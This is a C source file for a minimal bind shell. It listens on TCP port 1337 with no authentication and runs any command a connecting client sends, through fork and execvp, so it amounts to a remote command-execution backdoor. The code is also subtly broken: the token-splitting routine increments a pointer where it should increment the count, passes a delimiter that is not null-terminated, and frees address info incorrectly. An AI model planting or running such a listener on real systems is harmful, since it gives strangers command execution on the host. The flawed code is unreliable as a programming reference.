#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>

#include <sys/wait.h>
#include <sys/types.h>
#include <errno.h>


int runCmd(char* cmd);
char** strsplit(char* str, char delim, size_t* numTokens);
int freeSplitStr(char** str);

int main(int argc, char ** argv) {
    int s;
    int sock_fd = socket(AF_INET, SOCK_STREAM,0);

    struct addrinfo hints, *results;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
  
    s = getaddrinfo(NULL, "1337", &hints, &results);
       
    if(s != 0) {
	fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
	exit(1);
    }

    int optval = 1;
    setsockopt(sock_fd, SOL_SOCKET, SO_REUSEPORT, &optval, sizeof(optval));

    if(bind(sock_fd, results->ai_addr, results->ai_addrlen) != 0) {
      perror("bind failed");
      exit(1);
    }

    if(listen(sock_fd, 10) != 0) {
      perror("listen failed");
      exit(1);
    }

   struct sockaddr_in *result_addr = (struct sockaddr_in*) results->ai_addr;
   printf("Listening on fd %d, port %d\n", sock_fd, ntohs(result_addr->sin_port));
   
   printf("waiting...");
   int client_fd = accept(sock_fd, NULL, NULL);
   printf("Connected");

   write(client_fd, "Connected", 10);
   char buffer[1000];
   int len;
   while(-1!= (len = read(client_fd, buffer, sizeof(buffer)-1)) ) {
      buffer[len] = '\0';
    int i = 0;
    while(buffer[i]!='\0'){
	if(buffer[i]=='\n'){
	    buffer[i]='\0';
        }
	i++;
    }
      if(0==strcmp(buffer, "exit")) { break;}
      
      printf("%s",buffer);
      runCmd(buffer);
   }

   free(results);
   shutdown(sock_fd, SHUT_RDWR);
   close(client_fd);
   close(sock_fd);
   
}

int runCmd(char* cmd) {
  size_t numTokens;
   char** cmdArr = strsplit(cmd, ' ', &numTokens);

   if(!cmdArr) {return -1;}
   pid_t pid= fork();
   if(-1== pid) {printf("fork failed"); return -1;}
   else if(pid>0) {
     int status;
     //freeSplitStr(cmdArr);
     waitpid(pid, &status, 0);
   } else {
      int exit_status = execvp(cmdArr[0], &cmdArr[0]);
      if( exit_status < 0) {printf("failed to exec %s: %s",cmdArr[0],strerror(errno));} 
      
      return exit_status;
   }
   
}

char** strsplit(char* str, char delim, size_t* numTokens) {
    char* savePtr;   
    char** splitStr = malloc(sizeof(char*)*2);
    char* tok=NULL;
    *numTokens=1;
    if(str[strlen(str)]=='\n') {str[strlen(str)]='\0';}
  
    splitStr[0] = strtok_r(str, &delim, &savePtr); 
    while( (splitStr[*numTokens] = strtok_r(NULL, &delim, &savePtr)) ) {
	splitStr = realloc(splitStr, sizeof(char*) * (*numTokens++));
    } 
 return splitStr; 
}

int freeSplitStr(char** str) {
  free(*str);
}
